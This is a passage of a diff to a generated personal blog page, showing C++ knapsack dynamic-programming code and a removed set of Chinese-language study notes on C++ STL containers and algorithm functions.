class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span>;<span class="comment">//物品最大件数</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1000</span>;<span class="comment">//V最大上限</span></span><br><span class="line"><span class="keyword">int</span> w[maxn],c[maxn],dp[maxv];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,V;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//下标从i开始</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//背包容量有可能为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        dp[v] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v = V; v &gt;= w[i]; v--)<span class="comment">//当v&lt;w[i]时dp值就是本身，所以不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            dp[v] = <span class="built_in">max</span>(dp[v], dp[v-w[i]] + c[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求最大值</span></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, dp[v]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/20/STL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Imane">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Imane's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/20/STL/" class="post-title-link" itemprop="url">STL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-10-20 11:10:24" itemprop="dateCreated datePublished" datetime="2020-10-20T11:10:24+08:00">2020-10-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-05-17 16:04:14" itemprop="dateModified" datetime="2021-05-17T16:04:14+08:00">2021-05-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="并不系统的STL学习历程"><a href="#并不系统的STL学习历程" class="headerlink" title="并不系统的STL学习历程"></a>并不系统的STL学习历程</h3><h4 id="upper-bound-amp-lower-bound"><a href="#upper-bound-amp-lower-bound" class="headerlink" title="upper_bound&amp;lower_bound"></a>upper_bound&amp;lower_bound</h4><p>在学动态规划LIS的时候知道了STL中这个算法，现简单记录。</p>
-<ul>
-<li><p>在升序(&gt;=)数组/容器中：</p>
-<p><strong>lower_bound( begin,end,num)：</strong>从数组的[begin,end)区间二分查找第一个<strong>大于或等于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
-<p><strong>upper_bound( begin,end,num)：</strong>从数组的[begin,end)区间二分查找第一个<strong>大于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
-</li>
-<li><p>在降序数组/容器中：</p>
-<p>需要重载lower_bound和upper_bound。</p>
-<p><strong>lower_bound( begin,end,num,greater<type>() )</strong>:从数组的[begin,end)区间二分查找第一个<strong>小于或等于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
-<p><strong>upper_bound( begin,end,num,greater<type>() )</strong>:从数组的[begin,end)区间二分查找第一个<strong>小于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
-</li>
-<li><p>lower_bound即数组中插入val元素也不影响数组顺序的第一个位置，upper_bound即插入val也不影响的最后一个位置</p>
-</li>
-</ul>
-<p>//具体原因待以后学比较器再想(<del>下次一定</del>)</p>
-<h2 id="系统的STL"><a href="#系统的STL" class="headerlink" title="系统的STL"></a>系统的STL</h2><h3 id="vector——变长数组"><a href="#vector——变长数组" class="headerlink" title="vector——变长数组"></a>vector——变长数组</h3><p>使用时加上vector头文件:<code>#include &lt;vector&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>vector&lt;typename&gt; name;</code> ——变长数组name[] <code>name.begin(),name.end()</code>取name首元素<strong>地址</strong>和尾元素地址的<strong>下一个地址</strong>（也类似于迭代器）</p>
-<p><code>vector&lt;typename&gt;::iterator it</code> ——迭代器it  <code>*it</code>为迭代器指向的内容，it不支持&lt;，只有==，!=，it++，++it</p>
-<blockquote>
-<p>vector和string中才有name.begin()+3z这种迭代器+整数的写法（即通过下标取元素name[3]）</p>
-<p>vector<int> 之间可以直接=赋值(？)</p>
-</blockquote>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>begin()</code>,<code>end()</code></li>
-<li><code>push_back(i)</code>, <code>pop_back(i)</code>  时间复杂度O(1)</li>
-<li><code>size()</code> O(1)</li>
-<li><code>clear()</code> O(N)</li>
-<li><code>insert(it,x)</code> O(N)  向it处插入x，比如<code>name.begin()+2</code>即向name[2]处插入x，原name[2]<strong>及</strong>后面的依次后移 </li>
-<li><code>erase(it)</code> O(N) 删除it处元素</li>
-<li><code>erase(first, last)</code> O(N) 删除[first, last)中所有元素</li>
-</ul>
-<h3 id="set——集合"><a href="#set——集合" class="headerlink" title="set——集合"></a>set——集合</h3><p>使用时加上set头文件:<code>#include &lt;set&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>set&lt;typename&gt; name;</code> ——name内部<strong>不含重复元素</strong>且<strong>有序</strong></p>
-<p><code>set&lt;typename&gt;::iterator it</code> ——迭代器it  <code>*it</code>为迭代器指向的内容，it不支持&lt;，只有==，!=，it++，++it</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>begin()</code>，<code>end()</code></li>
-<li><code>insert(x)</code> O(logN) 自动排序去重</li>
-<li><code>it = name.find(x)</code> O(logN) 返回x对应的迭代器</li>
-<li><code>erase(it),erase(x)</code> O(1)，O(lonN)</li>
-<li><code>erase(first, last)</code> O(last-first)</li>
-<li><code>size()</code> O(1)</li>
-<li><code>clear()</code> O(N)</li>
-</ul>
-<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>使用时加上string头文件:<code>#include &lt;string&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>string str = &quot;abcd&quot;;</code>  ——可以通过下标str[i]访问（和vector一样）</p>
-<blockquote>
-<p> 只能用<code>cin</code>，<code>cout</code>（<code>#include &lt;iostream&gt;</code>）输出整个str</p>
-<p><code>.c_str()</code>可以将其变为c的字符数组</p>
-</blockquote>
-<p><code>string::iterator it;</code> ——迭代器it</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>begin()</code>，<code>end()</code></li>
-<li><code>+=</code> 直接拼接两个string</li>
-<li><code>==,!+,&lt;,&lt;=,&gt;,&gt;=</code> 按照字典序比较大小</li>
-<li><code>length()/size()</code> O(1)  string长度（没有’\0’)</li>
-<li><code>insert(pos,string)</code> O(N) 在pos位置插入string （pos是数字）</li>
-<li><code>insert(it,it2,it3)</code> 在it处插入[it2, int3)</li>
-<li><code>erase(it)</code> O(N) </li>
-<li><code>erase(first,last)</code> O(N) </li>
-<li><code>erase(pos,length)</code> O(N) pos是数字</li>
-<li><code>clear()</code> O(1)</li>
-<li><code>substr(pos,len)</code> O(len) 返回子串(类型为string）</li>
-<li><code>find(str2)</code> O(nm) 在str中查找str2，返回其第一次出现的pos，如果没找到返回<code>string::npos</code></li>
-<li><code>find(str2,pos)</code> O(nm) 从str的pos处开始匹配str2</li>
-<li><code>replace(pos,len,str2)</code> O(N) 把str的pos位开始长位len的子串替换为str2（str2不一定要和子串一样长）</li>
-<li><code>replace(it1,it2,str2)</code> O(N) 把str的[it1, it2)范围的子串替换为str2</li>
-</ul>
-<h3 id="map——字典"><a href="#map——字典" class="headerlink" title="map——字典"></a>map——字典</h3><p>使用时加上map头文件:<code>#include &lt;map&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>map&lt;typename1, typename2&gt; mp;</code> ——typename1为key，typename2为value，按照键值排序</p>
-<p>可以通过下标（键）访问，例如<code>mp[&#39;c&#39;]</code></p>
-<blockquote>
-<p>注意键是唯一的，也就是上述的’c’所对应的值只有一个，当写入另一个之前的就会被覆盖</p>
-</blockquote>
-<p><code>map&lt;typename1,typename2&gt;::iterator it</code> ——迭代器it  <code>it-&gt;first</code>可以访问键，<code>it-&gt;second</code>访问值</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>begin()</code>，<code>end()</code></li>
-<li><code>find(key)</code> O(logN) 返回key所对应的<strong>迭代器</strong></li>
-<li><code>erase(it)</code> O(1) 删除键值对</li>
-<li><code>erase(key)</code> O(logN) 删除键值对</li>
-<li><code>erase(first,last)</code> O(last-first) </li>
-<li><code>size()</code> O(1)</li>
-<li><code>clear()</code> O(N)</li>
-<li><code>insert(make_pair(&quot;haha&quot;, 5));</code> 插入键值对</li>
-</ul>
-<p><strong>用途：</strong></p>
-<ul>
-<li>建立字符串到整数的映射</li>
-</ul>
-<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>使用时加上queue头文件:<code>#include &lt;queue&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>queue&lt;typename&gt; name;</code> ——先进先出</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><p><code>push(x),pop()</code> O(1)，O(1) 入队，队首元素出队</p>
-<blockquote>
-<p>入队的只是元素x的副本，当在外面修改x，并不会改变queue内的x值</p>
-</blockquote>
-</li>
-<li><p><code>front(),back()</code> O(1)，O(1) 获取队首队尾元素</p>
-</li>
-<li><p><code>empty()</code> O(1) 为空返回true</p>
-<blockquote>
-<p>使用front和pop前要先用empty判断是否为空</p>
-</blockquote>
-</li>
-<li><p><code>size()</code> O(1)</p>
-</li>
-</ul>
-<p><strong>用途：</strong></p>
-<ul>
-<li>实现广度优先搜索</li>
-</ul>
-<h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>使用时加上queue头文件:<code>#include &lt;queue&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>priority_queue&lt;typename&gt; name;</code> ——队首元素优先级最高</p>
-<p>只能访问队首元素</p>
-<p><strong>常见函数：</strong></p>
-<ul>
-<li><p><code>push(x)</code> O(logN) 将x入队</p>
-</li>
-<li><p><code>top()</code> O(1) 访问队首元素</p>
-</li>
-<li><p><code>pop()</code> O(logN) 弹出队首元素</p>
-</li>
-<li><p><code>empty()</code> O(1) 检测优先队列是否为空</p>
-<blockquote>
-<p>使用top，pop前必须先判断empty</p>
-</blockquote>
-</li>
-<li><p><code>size()</code> O(1) </p>
-</li>
-</ul>
-<p><strong>优先级的设置：</strong></p>
-<ul>
-<li><p>基本数据类型（int，char，double）</p>
-<p>默认数字大的优先级高，因此以下两种写法等价</p>
-<p><code>priority_queue&lt;int&gt; q;</code> <code>priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt; &gt; q;</code></p>
-<p>其中<code>vector&lt;int&gt;</code>代表堆使用的容器，<code>less&lt;int&gt;</code>表示数字越大优先级越高，相应的<code>greater&lt;int&gt;</code>表示数字越小优先级越高</p>
-</li>
-<li><p>结构体</p>
-<ul>
-<li><p>友元法设定优先级</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fruit</span>&#123;</span></span><br><span class="line">	string name;</span><br><span class="line">	<span class="keyword">int</span> price;</span><br><span class="line">	<span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (fruit f1, fruit f2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> f1.price &gt; f2.price;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//此时fruit类型的运算符&lt;已经重载成了&gt;,即以前正常比较大小,编译器会用&lt;先排序然后把最大的放在开头,现在编译器变成了用&gt;排序,但是它仍然认为是&lt;,即它会认为实际最小的数是最大的</span></span><br><span class="line"><span class="comment">//例如: 实际排序: 5&gt;4&gt;3&gt;2&gt;1(排序的结果是重载运算符的) 编译器会认为 5&lt;4&lt;3&lt;2&lt;1(但编译器认为这个序列是由小到大的),即1是最大的</span></span><br><span class="line">priority_queue&lt;fruit&gt; q;</span><br><span class="line"><span class="comment">//此时小数优先级高</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意c++只能重载&lt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>函数法设定优先级</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fruit</span>&#123;</span></span><br><span class="line">	string name;</span><br><span class="line">	<span class="keyword">int</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(fruit f1, fruit f2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> f1.price &gt; f2.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">priority_queue&lt;fruit, vector&lt;fruit&gt;, cmp&gt; q;</span><br><span class="line"><span class="comment">//此时只能用这种方法定义q</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>使用时加上stack头文件:<code>#include &lt;stack&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<p><code>stack&lt;typename&gt; name;</code> ——后进先出</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>push(x)</code> O(1)</li>
-<li><code>pop()</code> O(1)</li>
-<li><code>top()</code> O(1)</li>
-<li><code>empty()</code> O(1)</li>
-<li><code>size()</code> O(1)</li>
-</ul>
-<h3 id="pair——有两个元素的结构体"><a href="#pair——有两个元素的结构体" class="headerlink" title="pair——有两个元素的结构体"></a>pair——有两个元素的结构体</h3><p>使用时加上pair头文件:<code>#include &lt;utility&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
-<blockquote>
-<p>由于在map中由pair的实现，所以map头文件中包含了utility，故无需再次定义utility</p>
-</blockquote>
-<p><code>pair&lt;typename1,typename2&gt; name;</code>  也可在定义的时候初始化<code>pair&lt;string,int&gt; p(&quot;abc&quot;,3)</code></p>
-<p><strong>pair访问</strong>和访问结构体一样，<code>p.first</code> <code>p.second</code>即可</p>
-<p><strong>pair赋值</strong>可以像结构体那样，先定义一个空pair，再<code>p.first = &quot;haha&quot;</code>来赋值；也可以使用<code>p = make_pair(&quot;haha&quot;, 5)</code>来赋值；也可以<code>p = pair&lt;string,int&gt;(&quot;haha&quot;,5)</code>来赋值</p>
-<p><strong>常用函数：</strong></p>
-<ul>
-<li><code>==,!+,&lt;,&lt;=,&gt;,&gt;=</code> 先比较第一个元素的大小，第一个元素相等再比较第二个，返回BOOL</li>
-</ul>
-<p><strong>用途：</strong></p>
-<ul>
-<li>替代二元结构体</li>
-<li>作为map的键值对来插入</li>
-</ul>
-<h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><ul>
-<li><p>max(),min(),abs()</p>
-<p>max和min必须是两个数的比较，abs参数必须是整数</p>
-</li>
-<li><p>swap(x,y)</p>
-<p>交换xy的值</p>
-</li>
-<li><p>reverse(it,it2)</p>
-<p>将数组指针或容器迭代器[it,it2)之间的元素反转</p>
-</li>
-<li><p>fill(it,it2,233)</p>
-<p>将数组指针或容器迭代器[it,it2)所指向的区间用某个值覆盖</p>
-</li>
-<li><p>next_permutation(it,it2)</p>
-<p>给出一个序列在全排列中的下一个序列，已达到最后一个时会返回false</p>
-</li>
-<li><p>sort(首元素地址，尾元素地址的下一个地址，[比较函数])（默认递增）</p>
-<ul>
-<li><p>基本数据类型数组的排序</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;<span class="comment">//&gt;是递减排序，&lt;是递增排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//记忆：&gt;本身就是递减的（左边大右边小）</span></span><br></pre></td></tr></table></figure></li>
-<li><p>结构体数组的排序</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">&#125;ssd[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//一级排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.x &gt; b.x;<span class="comment">//按照x递减排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二级排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.x != b.x)</span><br><span class="line">        <span class="keyword">return</span> a.x &gt; b.x;<span class="comment">//首先按照x排序</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.y &lt; b.y;<span class="comment">//如果x相等按照y递增排序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>容器的排序</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//容器中只有vector,string,deque(双端队列)是可以用sort排序的</span></span><br><span class="line"><span class="comment">//vector</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;<span class="comment">//因为vector中元素是int所以比较int型，cmp本质是在比较元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//string</span></span><br><span class="line">string str[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(string str1, string str2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str1.<span class="built_in">length</span>() &lt; str2.<span class="built_in">length</span>();<span class="comment">//按照string长度递增排序(默认是字典序递增)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>lower_bound()和upper_bound()</p>
-<p>它们都需要在一个有序数组或容器中使用(增序)</p>
-<p><code>lower_bound(first,last,val)</code>用来寻找数组或容器的[first,last)范围内第一个值<strong>大于等于</strong>val的数的地址，如果没有满足的则返回第一个可以插入该数的指针。</p>
-<p><code>upper_bound(first,last,val)</code>用来寻找数组或容器的[first,last)范围内第一个值<strong>大于</strong>val的数的地址，如果没有满足的则返回第一个可以插入该数的指针。</p>
-</li>
-</ul>
 
       
     </div>
@@ -2189,7 +2077,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
